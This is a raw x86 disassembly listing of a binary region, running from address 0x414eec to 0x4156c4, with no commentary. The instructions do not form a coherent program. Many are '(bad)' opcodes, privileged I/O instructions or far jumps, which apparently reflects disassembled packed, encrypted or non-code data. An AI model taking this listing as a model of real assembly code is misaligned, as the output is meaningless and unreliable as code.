  414eec:	xchg   esi,eax
  414eed:	sbb    eax,0xb155127
  414ef2:	inc    edx
  414ef3:	dec    ecx
  414ef4:	pop    ds
  414ef5:	out    0xdd,eax
  414ef7:	add    BYTE PTR [eax],0x34
  414efa:	sub    eax,0xe07bc731
  414eff:	leave  
  414f00:	push   eax
  414f01:	(bad)  
  414f02:	call   0x873f:0xfd9f28e6
  414f09:	(bad)  [esi]
  414f0b:	mov    ah,0x8c
  414f0d:	or     bh,BYTE PTR ds:0x519e6c0c
  414f13:	mov    ds,edi
  414f15:	xor    eax,0x7485f7d4
  414f1a:	(bad)  
  414f1b:	jecxz  0x414f0b
  414f1d:	fld    TBYTE PTR [ecx+0x3074ade8]
  414f23:	xchg   BYTE PTR [eax-0xe],cl
  414f26:	and    DWORD PTR [edx-0x2c],esp
  414f29:	daa    
  414f2a:	int3   
  414f2b:	or     al,0xec
  414f2d:	adc    DWORD PTR [edi+0x2de48fe0],ebp
  414f33:	ror    DWORD PTR [edi-0x31ad9749],1
  414f39:	push   eax
  414f3a:	scas   al,BYTE PTR es:[edi]
  414f3b:	push   cs
  414f3c:	sbb    ebx,eax
  414f3e:	pushf  
  414f3f:	ins    DWORD PTR es:[edi],dx
  414f40:	test   DWORD PTR [eax+0x59],ebp
  414f43:	xlat   BYTE PTR ds:[ebx]
  414f44:	jo     0x414f9f
  414f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f47:	les    ebx,FWORD PTR [esi+0xa]
  414f4a:	cmp    dh,BYTE PTR [edi+ecx*2-0x178b06c2]
  414f51:	(bad)  
  414f52:	dec    edi
  414f53:	cs sti 
  414f55:	mov    dl,0xc4
  414f57:	inc    esp
  414f58:	sub    eax,0x68b71d50
  414f5d:	cmp    eax,0x54a4184d
  414f62:	or     DWORD PTR [ebx+0x7c],esp
  414f65:	repz adc esi,DWORD PTR [edi]
  414f68:	add    BYTE PTR [edi+ecx*4+0x1c],ah
  414f6c:	cmp    DWORD PTR [ecx-0x9],ecx
  414f6f:	jbe    0x414ef8
  414f71:	add    ah,BYTE PTR [edx+0x21]
  414f74:	dec    edi
  414f75:	jp     0x414f3b
  414f77:	xchg   esp,eax
  414f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f79:	popf   
  414f7a:	loop   0x414fec
  414f7c:	imul   ebp,esp,0x5b2b6804
  414f82:	(bad)  
  414f83:	fist   DWORD PTR [edx]
  414f85:	ins    DWORD PTR es:[edi],dx
  414f86:	mov    bl,0x50
  414f88:	mov    esi,0x7d134f9c
  414f8d:	inc    eax
  414f8e:	or     bl,BYTE PTR [edx+0x56]
  414f91:	jb     0x414f18
  414f93:	out    dx,eax
  414f94:	mov    al,ds:0x454a8a73
  414f99:	xchg   ecx,eax
  414f9a:	ins    DWORD PTR es:[edi],dx
  414f9b:	jae    0x414f96
  414f9d:	or     dh,BYTE PTR [esi-0x69]
  414fa0:	mov    ah,0xbc
  414fa2:	fwait
  414fa3:	pop    edi
  414fa4:	sbb    ebx,ecx
  414fa6:	xchg   edi,eax
  414fa7:	mov    ebp,0xe92307fc
  414fac:	mov    ch,0x17
  414fae:	jbe    0x414ff6
  414fb0:	adc    bh,0x10
  414fb3:	enter  0xfae5,0xb6
  414fb7:	or     BYTE PTR [edx],bl
  414fb9:	adc    eax,DWORD PTR [edi]
  414fbb:	mov    ebp,0x85de13b
  414fc0:	pop    edi
  414fc1:	int3   
  414fc2:	dec    ebx
  414fc3:	jmp    0x414f87
  414fc5:	pop    edx
  414fc6:	inc    ecx
  414fc7:	add    DWORD PTR [edi-0x10652b05],0x3e2130e5
  414fd1:	xchg   ecx,eax
  414fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd3:	int    0x5d
  414fd5:	test   DWORD PTR [ebx-0xe1f3579],0xce1f5037
  414fdf:	add    eax,0x2c27854b
  414fe4:	iret   
  414fe5:	bound  esi,QWORD PTR [ebx+0x450c751b]
  414feb:	jp     0x414ff9
  414fed:	pushf  
  414fee:	sub    DWORD PTR ds:0x8046eacb,0x38e2522
  414ff8:	mov    ah,0x7d
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	dec    ecx
  414ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ffd:	push   0xffffff9c
  414fff:	and    cl,ah
  415001:	xchg   ebx,eax
  415002:	mov    BYTE PTR [edx+0x3a1a0e05],ah
  415008:	xchg   DWORD PTR [edi],esp
  41500a:	leave  
  41500b:	xchg   ecx,eax
  41500c:	loopne 0x415011
  41500e:	sbb    eax,0xcb8372f1
  415013:	in     eax,dx
  415014:	mov    al,0xc4
  415016:	push   es
  415017:	hlt    
  415018:	push   ss
  415019:	sbb    esp,edx
  41501b:	lock push cs
  41501d:	jecxz  0x41504d
  41501f:	pop    esi
  415020:	scas   eax,DWORD PTR es:[edi]
  415021:	and    bl,bl
  415023:	add    esp,DWORD PTR [edx-0x197d338c]
  415029:	mov    eax,0xee4710d9
  41502e:	fild   QWORD PTR ds:0xae3bae43
  415034:	xchg   edi,eax
  415035:	dec    eax
  415036:	cdq    
  415037:	dec    esi
  415038:	shl    DWORD PTR [esi],cl
  41503a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41503b:	adc    esp,DWORD PTR [ecx-0x54]
  41503e:	jns    0x415007
  415040:	not    DWORD PTR [ebx+0x4b]
  415043:	scas   eax,DWORD PTR es:[edi]
  415044:	(bad)  
  415045:	cwde   
  415046:	sbb    DWORD PTR [esi-0x30],esp
  415049:	push   ecx
  41504a:	fcmovu st,st(4)
  41504c:	jnp    0x415087
  41504e:	nop
  41504f:	push   ds
  415050:	out    0x1a,al
  415052:	aaa    
  415053:	fist   WORD PTR [ebp-0x47]
  415056:	push   ds
  415057:	cmp    al,0x4f
  415059:	jno    0x41504c
  41505b:	imul   eax,DWORD PTR [edi],0xb71dcb26
  415061:	xor    dh,dh
  415063:	rol    BYTE PTR [edx+0x5fd564fc],0xa0
  41506a:	add    ah,BYTE PTR [edx-0x69]
  41506d:	daa    
  41506e:	mov    ebx,0xbd9eb345
  415073:	xchg   DWORD PTR [eax+0x13],edx
  415076:	cmp    DWORD PTR [ebx-0x59],0x42998b55
  41507d:	sub    eax,DWORD PTR [eax+ecx*4-0x3970802a]
  415084:	sub    eax,0x3c3f24e7
  415089:	cwde   
  41508a:	fisub  DWORD PTR [eax+0x6243e9a9]
  415090:	and    bh,BYTE PTR [edi-0x9]
  415093:	or     BYTE PTR [ecx],cl
  415095:	and    eax,0x6af32f7d
  41509a:	std    
  41509b:	mov    esi,0x3a5d869e
  4150a0:	arpl   WORD PTR [ebp-0x4b],sp
  4150a3:	sbb    DWORD PTR [edx+ecx*1+0x1e],ecx
  4150a7:	xchg   edi,eax
  4150a8:	push   0xffffff98
  4150aa:	js     0x4150c7
  4150ac:	mov    ah,0xcd
  4150ae:	dec    edx
  4150af:	jae    0x41511d
  4150b1:	add    al,BYTE PTR [eax+0x52b78c25]
  4150b7:	out    dx,eax
  4150b8:	sbb    DWORD PTR [eax],ebp
  4150ba:	push   0x33bce500
  4150bf:	adc    al,0x3a
  4150c1:	dec    esp
  4150c2:	ss dec eax
  4150c4:	pop    edx
  4150c5:	pop    esp
  4150c6:	data16 cld 
  4150c8:	loopne 0x4150d9
  4150ca:	cmp    eax,0x2085a2a9
  4150cf:	jp     0x415056
  4150d1:	xchg   ecx,eax
  4150d2:	mov    dl,0x77
  4150d4:	push   ebx
  4150d5:	push   edi
  4150d6:	cmp    dh,BYTE PTR [edi-0x5dcd98e3]
  4150dc:	jecxz  0x41508c
  4150de:	inc    eax
  4150df:	sbb    al,BYTE PTR [edi-0x61]
  4150e2:	jecxz  0x41506f
  4150e4:	rcr    BYTE PTR [edi+ebp*8+0x6c9104ed],cl
  4150eb:	dec    eax
  4150ec:	xchg   DWORD PTR [ecx-0xe],edx
  4150ef:	and    edx,DWORD PTR [edx]
  4150f1:	ud2    
  4150f3:	push   ss
  4150f4:	and    esi,ecx
  4150f6:	or     al,BYTE PTR [edi+0x1476435f]
  4150fc:	rol    esi,1
  4150fe:	cwde   
  4150ff:	popa   
  415100:	mov    esi,0x86e07701
  415105:	popa   
  415106:	jno    0x415112
  415108:	jl     0x415149
  41510a:	ret    
  41510b:	and    ebx,edx
  41510d:	arpl   WORD PTR [ebx+0x66c52684],sp
  415113:	pop    ecx
  415114:	sti    
  415115:	(bad)  
  415116:	outs   dx,BYTE PTR ds:[esi]
  415117:	mov    edx,DWORD PTR [esp+ecx*2]
  41511a:	mov    ch,0xaa
  41511c:	popf   
  41511d:	push   eax
  41511e:	loope  0x4150d3
  415120:	pop    ss
  415121:	iret   
  415122:	and    eax,0xd5eac2e9
  415127:	loope  0x4150b8
  415129:	mov    ebp,DWORD PTR ds:[edi+0x5cd251c9]
  415130:	aas    
  415131:	lahf   
  415132:	or     al,BYTE PTR ds:0xca32480e
  415138:	mov    ds:0xc691443,eax
  41513d:	repz pop ds
  41513f:	mov    dh,0x7b
  415141:	(bad)  
  415142:	into   
  415143:	gs push es
  415145:	jmp    0x4150cc
  415147:	mov    dl,0x21
  415149:	and    al,0xd8
  41514b:	jp     0x415199
  41514d:	jl     0x4150f5
  41514f:	sub    ebx,DWORD PTR ds:0x3e21ace2
  415155:	pop    ss
  415156:	dec    ebx
  415157:	push   DWORD PTR ds:[edi+0x247c792b]
  41515e:	sbb    DWORD PTR [edx],esi
  415160:	call   0x3201:0x71dbcb08
  415167:	push   es
  415168:	aas    
  415169:	lahf   
  41516a:	(bad)  
  41516b:	mov    eax,0x3866dba1
  415170:	outs   dx,DWORD PTR ds:[esi]
  415171:	jmp    0x1ce3bb5a
  415176:	push   ebx
  415177:	pusha  
  415178:	mov    al,ds:0x252d85b6
  41517d:	jb     0x415110
  41517f:	dec    ebp
  415180:	mov    ebp,0xeb3a514c
  415185:	fmulp  st(2),st
  415187:	push   ds
  415188:	mov    dh,0x9
  41518a:	mov    ch,0x98
  41518c:	xchg   BYTE PTR [ebx+0x25482f90],al
  415192:	xor    BYTE PTR [ecx],dh
  415194:	pop    ecx
  415195:	sbb    edi,edi
  415197:	fdivr  QWORD PTR [esi]
  415199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41519a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41519b:	sub    eax,0x83312410
  4151a0:	pusha  
  4151a1:	ficom  DWORD PTR [ebp+ecx*8-0x52]
  4151a5:	dec    DWORD PTR [eax-0x72494912]
  4151ab:	(bad)  
  4151ac:	jae    0x415134
  4151ae:	cmp    eax,0x68f2d90
  4151b3:	push   ebx
  4151b4:	xor    eax,0x77d4ba7f
  4151b9:	cmp    al,0xa1
  4151bb:	sub    DWORD PTR fs:[esi],edi
  4151be:	fisttp QWORD PTR [edx]
  4151c0:	imul   ecx,DWORD PTR [eax-0x1a3159a4],0xffffffe2
  4151c7:	adc    BYTE PTR [ebx+ebp*1-0x54],ch
  4151cb:	mov    edi,0x3ea4ab21
  4151d0:	or     eax,DWORD PTR [ecx-0x43]
  4151d3:	mov    ds:0x7b0bb595,al
  4151d8:	sub    eax,DWORD PTR [eax-0x7ce6c2b7]
  4151de:	xchg   edx,eax
  4151df:	sub    eax,0xe0680e7e
  4151e4:	cmp    DWORD PTR [ebp+0x530f87d],0xae605fc6
  4151ee:	sub    eax,0x2928c7f1
  4151f3:	ja     0x4151b2
  4151f5:	add    cl,BYTE PTR ds:0xac5966d0
  4151fb:	ja     0x415223
  4151fd:	nop
  4151fe:	imul   BYTE PTR [ecx+edx*8]
  415201:	mov    BYTE PTR [bp+di-0x20],ah
  415205:	dec    ebp
  415206:	imul   DWORD PTR [ecx]
  415208:	xchg   ebx,eax
  415209:	das    
  41520a:	cld    
  41520b:	scas   eax,DWORD PTR es:[edi]
  41520c:	dec    edi
  41520d:	test   al,0xd3
  41520f:	and    eax,0x1a1c06ef
  415214:	add    eax,DWORD PTR [edx-0xc]
  415217:	mov    dh,0x8f
  415219:	pop    ss
  41521a:	(bad)  
  41521b:	sti    
  41521c:	xchg   esi,eax
  41521d:	aad    0x4f
  41521f:	mov    cl,0x1c
  415221:	and    edi,DWORD PTR [eax]
  415223:	jle    0x415208
  415225:	or     eax,0x824b8f47
  41522a:	in     eax,0x17
  41522c:	jmp    0x4151e3
  41522e:	push   es
  41522f:	add    DWORD PTR [ecx-0x54],ebx
  415232:	adc    al,bl
  415234:	add    DWORD PTR [edi-0x201f7589],ebx
  41523a:	test   eax,0x7a158f09
  41523f:	push   ds
  415240:	ficomp WORD PTR [edi-0x1ffe4930]
  415246:	xor    al,BYTE PTR [ebx]
  415248:	mov    ch,0x52
  41524a:	sub    dh,BYTE PTR [eax]
  41524c:	mov    bh,0xaf
  41524e:	pop    ds
  41524f:	xchg   edi,eax
  415250:	dec    ecx
  415251:	and    BYTE PTR [ecx],0xa9
  415254:	ffreep st(0)
  415256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415257:	push   ss
  415258:	and    eax,0x4eee33bd
  41525d:	push   edx
  41525e:	push   ss
  41525f:	sbb    al,0x87
  415261:	adc    edi,DWORD PTR [edi+ecx*4+0x4fb38bdf]
  415268:	add    ebp,edx
  41526a:	sbb    BYTE PTR [edx+ebp*1],ch
  41526d:	xor    BYTE PTR [eax],ah
  41526f:	aaa    
  415270:	enter  0xa3a8,0x98
  415274:	imul   edi,ebp,0xffffffa1
  415277:	stc    
  415278:	and    eax,0xcfa5dd82
  41527d:	lods   eax,DWORD PTR ds:[esi]
  41527e:	mov    al,ds:0x8a1437c0
  415283:	mov    dh,BYTE PTR [esi]
  415285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415286:	fild   WORD PTR [edx+0x16b6e3c8]
  41528c:	cli    
  41528d:	jle    0x415276
  41528f:	and    eax,0xc6a205cf
  415294:	cld    
  415295:	pop    ss
  415296:	sahf   
  415297:	aam    0xee
  415299:	xchg   edi,eax
  41529a:	dec    eax
  41529b:	mov    dl,0xa6
  41529d:	jno    0x4152e1
  41529f:	les    ebp,FWORD PTR [eax+0xa]
  4152a2:	push   esp
  4152a3:	call   0xb7a5ee23
  4152a8:	jecxz  0x415272
  4152aa:	stos   DWORD PTR es:[edi],eax
  4152ab:	test   BYTE PTR [ecx],dl
  4152ad:	push   edi
  4152ae:	nop
  4152af:	fist   DWORD PTR [edi-0x1c]
  4152b2:	jno    0x415257
  4152b4:	pop    edi
  4152b5:	lods   eax,DWORD PTR ds:[esi]
  4152b6:	mov    al,ds:0x9256a32f
  4152bb:	mov    ecx,0x6dbbe95b
  4152c0:	fnsave [eax-0x39]
  4152c3:	mov    al,0x35
  4152c5:	sub    BYTE PTR [ecx-0x727f5535],cl
  4152cb:	repnz push esi
  4152cd:	dec    edx
  4152ce:	dec    ebx
  4152cf:	in     eax,dx
  4152d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152d1:	mov    ebp,0xba542e98
  4152d6:	mov    WORD PTR [ecx-0x3f88055c],gs
  4152dc:	mov    ch,0x30
  4152de:	jp     0x4152d7
  4152e0:	sub    BYTE PTR [ecx],0x90
  4152e3:	mov    WORD PTR [edx-0x51e5ed10],?
  4152e9:	add    bl,dh
  4152eb:	xchg   esp,eax
  4152ec:	sub    BYTE PTR cs:[edi+0x5e],dh
  4152f0:	sub    DWORD PTR [eax],0xffffffae
  4152f3:	add    eax,DWORD PTR [ecx]
  4152f5:	(bad)  
  4152f6:	xor    eax,0x7fde7f48
  4152fb:	pop    edi
  4152fc:	or     ch,BYTE PTR [ebx+0x2521adc5]
  415302:	ins    BYTE PTR es:[edi],dx
  415303:	(bad)  
  415304:	push   edx
  415305:	outs   dx,DWORD PTR ds:[esi]
  415306:	xchg   ebx,eax
  415307:	push   edx
  415308:	jbe    0x41530d
  41530a:	mov    ah,0xbb
  41530c:	jnp    0x415312
  41530e:	cmp    DWORD PTR [ecx],0x66f45167
  415314:	test   eax,0x54eff5bf
  415319:	imul   edx,DWORD PTR [esi+0x7a],0x7ebf4f11
  415320:	xor    DWORD PTR [edi-0x47793ba2],eax
  415326:	xchg   edx,eax
  415327:	ja     0x415377
  415329:	sbb    al,0xdf
  41532b:	mov    ?,WORD PTR [edi]
  41532d:	mov    ecx,0x3fc95fdd
  415332:	shl    bh,cl
  415334:	retf   0x52c9
  415337:	adc    esi,DWORD PTR [esi]
  415339:	pop    ss
  41533a:	in     eax,dx
  41533b:	sti    
  41533c:	and    al,0xe1
  41533e:	mov    ds:0x959c36ed,eax
  415343:	xor    eax,0xc86c47ae
  415348:	ret    
  415349:	xor    eax,0x4419c21
  41534e:	stc    
  41534f:	imul   ebx,DWORD PTR fs:[eax],0x900e8984
  415356:	jne    0x415334
  415358:	xchg   ebx,eax
  415359:	lea    edi,[ebx-0x19]
  41535c:	mov    dh,0x14
  41535e:	add    eax,DWORD PTR [ebx+ebx*1-0x7a]
  415362:	int    0x9f
  415364:	add    eax,0x35fcf345
  415369:	lds    eax,FWORD PTR [ebx+0x35]
  41536c:	jne    0x4153a9
  41536e:	xor    ebx,ebp
  415370:	daa    
  415371:	xor    bl,BYTE PTR [ecx+0x4]
  415374:	cmc    
  415375:	scas   al,BYTE PTR es:[edi]
  415376:	jbe    0x415370
  415378:	sbb    cl,BYTE PTR [ebx+eax*4-0x4b3b4ba3]
  41537f:	dec    esi
  415380:	push   ebp
  415381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415382:	mov    BYTE PTR [ebp+0x10],ch
  415385:	mov    bh,BYTE PTR [esi+0x48c57803]
  41538b:	and    esp,DWORD PTR [ebp-0x2b]
  41538e:	xor    eax,DWORD PTR [esi+0x69767141]
  415394:	fsub   QWORD PTR [eax+0x1e]
  415397:	popf   
  415398:	dec    eax
  415399:	and    eax,0xff1907e4
  41539e:	jp     0x41535b
  4153a0:	in     eax,0x5c
  4153a2:	test   al,0xf
  4153a4:	mov    ebp,0x92367cb0
  4153a9:	add    DWORD PTR [ebp+edx*2+0x1da835ad],eax
  4153b0:	jmp    0x2f99:0xb0edc
  4153b7:	and    ecx,DWORD PTR [edi+0x75f5207e]
  4153bd:	fistp  QWORD PTR [ecx]
  4153bf:	adc    DWORD PTR [ecx-0x6c413fd5],0xffffff9b
  4153c6:	cmp    DWORD PTR [edi+0x33],eax
  4153c9:	dec    esp
  4153ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153cb:	adc    BYTE PTR [edx+0x79a7f5e3],dl
  4153d1:	and    al,BYTE PTR [eax-0x52a8bd76]
  4153d7:	fist   WORD PTR [ebx+0x3b2b4ccc]
  4153dd:	jp     0x4153c9
  4153df:	sub    DWORD PTR [esi-0x2e],eax
  4153e2:	scas   eax,DWORD PTR es:[edi]
  4153e3:	ror    bl,1
  4153e5:	push   ebp
  4153e6:	push   edx
  4153e7:	mov    DWORD PTR [esi+edi*1],edx
  4153ea:	mov    edx,0x19e641eb
  4153ef:	in     al,dx
  4153f0:	add    al,0x4e
  4153f2:	pop    ebp
  4153f3:	fwait
  4153f4:	scas   eax,DWORD PTR es:[edi]
  4153f5:	cli    
  4153f6:	(bad)  
  4153f7:	sar    DWORD PTR [esi+eax*8],1
  4153fa:	pop    edx
  4153fb:	xchg   ebp,eax
  4153fc:	lea    edi,[esi]
  4153fe:	inc    ebx
  4153ff:	ds dec esp
  415401:	cmp    DWORD PTR [eax-0x7557eb0d],ecx
  415407:	dec    ebx
  415408:	fwait
  415409:	popa   
  41540a:	dec    ebx
  41540b:	stos   BYTE PTR es:[edi],al
  41540c:	jb     0x4153d0
  41540e:	fsub   st,st(7)
  415410:	xor    edi,eax
  415412:	scas   al,BYTE PTR es:[edi]
  415413:	stos   DWORD PTR es:[edi],eax
  415414:	xor    BYTE PTR [ebx+0x22],al
  415417:	(bad)  
  415418:	aad    0xcb
  41541a:	inc    edi
  41541b:	daa    
  41541c:	(bad)  
  41541e:	aam    0xad
  415420:	pusha  
  415421:	push   eax
  415422:	inc    ebx
  415423:	and    eax,0xbc62e329
  415428:	enter  0x8770,0x75
  41542c:	and    eax,ebx
  41542e:	ret    0xa2e2
  415431:	(bad)
  415435:	xor    esp,0xffffffc5
  415438:	(bad)  
  415439:	in     eax,0xd7
  41543b:	in     al,0xf2
  41543d:	scas   eax,DWORD PTR es:[edi]
  41543e:	pop    ds
  41543f:	dec    ebx
  415440:	in     eax,dx
  415441:	xchg   edi,eax
  415442:	xor    BYTE PTR [edx+0x4b],0x3b
  415446:	jp     0x4154b6
  415448:	rcl    ch,1
  41544a:	hlt    
  41544b:	mov    ebx,0x647dbe97
  415450:	imul   esi,DWORD PTR [ebp-0x2daac3fd],0x36fd240e
  41545a:	in     eax,0x3a
  41545c:	gs cwde 
  41545e:	fcmove st,st(4)
  415460:	jmp    0x4153f1
  415462:	cmp    eax,0x7cbe7f15
  415467:	and    BYTE PTR [ebx-0x23aeab34],ah
  41546d:	push   ebp
  41546e:	and    al,0x4e
  415470:	jbe    0x41540d
  415472:	pop    edx
  415473:	add    edx,0xd2c214dd
  415479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41547a:	std    
  41547b:	jmp    0xac894cca
  415480:	out    dx,al
  415481:	xor    DWORD PTR [ebp+0x4c],eax
  415484:	cmp    DWORD PTR [ecx-0xd],ebx
  415487:	dec    eax
  415488:	inc    esp
  415489:	adc    BYTE PTR [edi-0x2eaa151b],0xae
  415490:	mov    ah,0x7b
  415492:	(bad)  
  415493:	xchg   esi,eax
  415494:	test   eax,0x23d6b24d
  415499:	jmp    DWORD PTR [ecx+eax*2+0x76]
  41549d:	neg    bh
  41549f:	and    esi,esp
  4154a1:	pop    es
  4154a2:	ds int3 
  4154a4:	xor    eax,0xbc64f43b
  4154a9:	(bad)
  4154ac:	inc    BYTE PTR [ebx]
  4154ae:	sbb    eax,0x2c6ac2be
  4154b3:	retf   
  4154b4:	rcr    DWORD PTR [edx-0x45],0x75
  4154b8:	sub    BYTE PTR [edi+0x60],bh
  4154bb:	lods   eax,DWORD PTR ds:[esi]
  4154bc:	push   ds
  4154bd:	mov    DWORD PTR [esi-0x11f14d88],eax
  4154c3:	inc    eax
  4154c4:	aad    0xc4
  4154c6:	cmp    edx,DWORD PTR [ecx]
  4154c8:	inc    esi
  4154c9:	adc    ch,BYTE PTR [edx]
  4154cb:	adc    BYTE PTR [ebp-0x67],bh
  4154ce:	mov    ebx,0x5c9f90b4
  4154d3:	mov    ebp,0xa22b09b8
  4154d8:	sbb    cl,BYTE PTR [ecx+eax*2]
  4154db:	not    BYTE PTR [edi+0x4c92fb59]
  4154e1:	add    eax,DWORD PTR [edx+0x20ccba9f]
  4154e7:	push   es
  4154e8:	xchg   ecx,eax
  4154e9:	and    al,0x6c
  4154eb:	mov    eax,0xcf7b055b
  4154f0:	ss xchg ebp,eax
  4154f2:	fsubr  QWORD PTR [ebx]
  4154f4:	lock sub al,0x70
  4154f7:	sub    BYTE PTR [ecx],bl
  4154f9:	jp     0x4154aa
  4154fb:	in     eax,dx
  4154fc:	aam    0x5f
  4154fe:	pop    ecx
  4154ff:	sbb    DWORD PTR [esi+ecx*1+0x501fdfa5],ecx
  415506:	and    eax,0x1a9cf187
  41550b:	in     al,0x43
  41550d:	data16 in al,0x1b
  415510:	and    eax,0xd3d607a4
  415515:	ins    DWORD PTR es:[edi],dx
  415516:	data16 mov bl,0x5f
  415519:	cmc    
  41551a:	push   esp
  41551b:	pop    edi
  41551c:	pop    esi
  41551d:	mov    esp,0x249be81a
  415522:	xor    eax,esp
  415524:	xchg   ecx,eax
  415525:	push   0x54
  415527:	popa   
  415528:	jns    0x4154d8
  41552a:	loope  0x41556c
  41552c:	xor    al,0xb5
  41552e:	sbb    dl,bl
  415530:	dec    edx
  415531:	ret    
  415532:	inc    ecx
  415533:	ds popf 
  415535:	fbld   TBYTE PTR [ebx+0x2c]
  415538:	sbb    DWORD PTR [edi],ecx
  41553a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41553b:	repz jno 0x4155b7
  41553e:	fcmovb st,st(7)
  415540:	popa   
  415541:	inc    edx
  415542:	stos   DWORD PTR es:[edi],eax
  415543:	cmp    eax,edx
  415545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415546:	push   ss
  415547:	mov    dh,0x43
  415549:	fdivr  st,st(0)
  41554b:	xchg   BYTE PTR [esp+ecx*1+0x3],bh
  41554f:	cmp    DWORD PTR [edi],edi
  415551:	(bad)  
  415552:	not    edx
  415554:	dec    esp
  415555:	mov    ebp,0x89cf40b4
  41555a:	in     eax,0x92
  41555c:	inc    ebx
  41555d:	lods   eax,DWORD PTR ds:[esi]
  41555e:	arpl   di,ax
  415560:	adc    al,0xd4
  415562:	add    eax,edx
  415564:	mov    edi,0x68b5447
  415569:	scas   al,BYTE PTR es:[edi]
  41556a:	jl     0x415529
  41556c:	pop    ds
  41556d:	mov    eax,0x1edddd9a
  415572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415573:	mov    dl,0x59
  415575:	dec    edx
  415576:	fldenv [ecx+0x72]
  415579:	sub    BYTE PTR [edx+0x35e3b39d],0x44
  415580:	jl     0x41553b
  415582:	inc    esp
  415583:	shr    BYTE PTR [esi+0x20],cl
  415586:	inc    esp
  415587:	lods   al,BYTE PTR ds:[esi]
  415588:	or     ebx,DWORD PTR [edi-0x7461caae]
  41558e:	pop    ecx
  41558f:	jno    0x41560c
  415591:	icebp  
  415592:	nop
  415593:	fld    DWORD PTR [ecx+0x7dd1afd4]
  415599:	aam    0x2a
  41559b:	push   eax
  41559c:	out    dx,al
  41559d:	xor    dh,BYTE PTR [eax]
  41559f:	inc    esp
  4155a0:	mov    esi,0x8096e1e7
  4155a5:	imul   esi,edi,0x42
  4155a8:	enter  0xde2b,0x26
  4155ac:	ins    DWORD PTR es:[edi],dx
  4155ad:	xchg   cl,dl
  4155af:	lods   eax,DWORD PTR ds:[esi]
  4155b0:	cmp    edi,ebx
  4155b2:	mov    eax,0x8bb685a1
  4155b7:	das    
  4155b8:	and    BYTE PTR [ebx+0x10e99876],0xac
  4155bf:	mov    edx,0x1c53be14
  4155c4:	mov    esp,DWORD PTR [edi+edi*2]
  4155c7:	jne    0x4155cc
  4155c9:	push   eax
  4155ca:	fidiv  WORD PTR [ebp-0x3a]
  4155cd:	lods   al,BYTE PTR ds:[esi]
  4155cf:	sub    cl,BYTE PTR [esi-0x5c]
  4155d2:	inc    esi
  4155d3:	outs   dx,DWORD PTR ds:[esi]
  4155d4:	mov    ecx,0x826d4214
  4155d9:	fucomip st,st(3)
  4155db:	push   eax
  4155dc:	xchg   esp,esi
  4155de:	jmp    0xefce:0x426ecd5a
  4155e5:	adc    al,0x92
  4155e7:	pop    edi
  4155e8:	mov    al,0xa9
  4155ea:	or     bl,bl
  4155ec:	addr16 enter 0x4edb,0x9d
  4155f1:	ret    0x542f
  4155f4:	mov    ebp,0x3c86b638
  4155f9:	pop    ecx
  4155fa:	pusha  
  4155fb:	xor    DWORD PTR [ecx],edi
  4155fd:	xchg   edi,eax
  4155fe:	aas    
  4155ff:	push   0xe398705a
  415604:	ret    0x62bf
  415607:	fimul  DWORD PTR [edx]
  415609:	mov    edi,0x16bf035a
  41560e:	out    dx,al
  41560f:	add    eax,0xb7f48bb2
  415614:	xchg   esp,eax
  415615:	(bad)  
  415616:	imul   ecx,esi,0x3d06b4bd
  41561c:	add    bl,bh
  41561e:	mov    bh,BYTE PTR [ebx-0x3528a800]
  415624:	jle    0x4155aa
  415626:	xor    DWORD PTR [edi+0x4f],edi
  415629:	pop    ebp
  41562a:	rcl    DWORD PTR [eax+0x25fd0a14],0x4
  415631:	cld    
  415632:	and    DWORD PTR [esi-0x2d59d5a4],0xffffff9c
  415639:	adc    dh,BYTE PTR ds:0x25a6ae49
  41563f:	retf   
  415640:	jle    0x41564a
  415642:	jmp    0x895e6837
  415647:	into   
  415648:	mov    ds:0xb1b780ab,al
  41564d:	jnp    0x415613
  41564f:	sbb    eax,0xaa698641
  415654:	push   ds
  415655:	sbb    DWORD PTR [ebp+0xfc34a1d],ebp
  41565b:	lea    edx,[esi]
  41565d:	pop    es
  41565e:	bound  esi,QWORD PTR [eax]
  415660:	mov    al,0x5a
  415662:	add    ebx,DWORD PTR [eax-0x3d]
  415665:	inc    ebx
  415666:	test   eax,0x1e851a8f
  41566b:	mov    dh,0x23
  41566d:	jl     0x41565c
  41566f:	and    eax,0x7e15760f
  415674:	xchg   ebx,eax
  415675:	sub    eax,0xa28fc7b6
  41567a:	inc    ebx
  41567b:	add    eax,0x8d730624
  415680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415681:	xchg   ecx,eax
  415682:	xchg   DWORD PTR [edi-0x65],edi
  415685:	in     al,0x26
  415687:	bound  edi,QWORD PTR [ebx+0x12e3e190]
  41568d:	adc    al,0xc0
  41568f:	xchg   ecx,eax
  415690:	mov    BYTE PTR [ecx-0x2716a86c],dh
  415696:	(bad)  
  415697:	int    0xa4
  415699:	popf   
  41569a:	aaa    
  41569b:	adc    eax,0x8b071e4a
  4156a0:	cwde   
  4156a1:	xor    DWORD PTR [ebp-0x5a7ea97f],esp
  4156a7:	arpl   WORD PTR ds:0x898bc394,bp
  4156ad:	xlat   BYTE PTR ds:[ebx]
  4156ae:	in     eax,0xec
  4156b0:	jb     0x41566a
  4156b2:	push   ebp
  4156b3:	sbb    ah,BYTE PTR [ebx-0x69]
  4156b6:	js     0x415695
  4156b8:	out    0x7a,eax
  4156ba:	jns    0x415695
  4156bc:	cmp    DWORD PTR [esp+ebx*1-0x62c164a9],0x47
  4156c4:	mov    edx,0x79914035
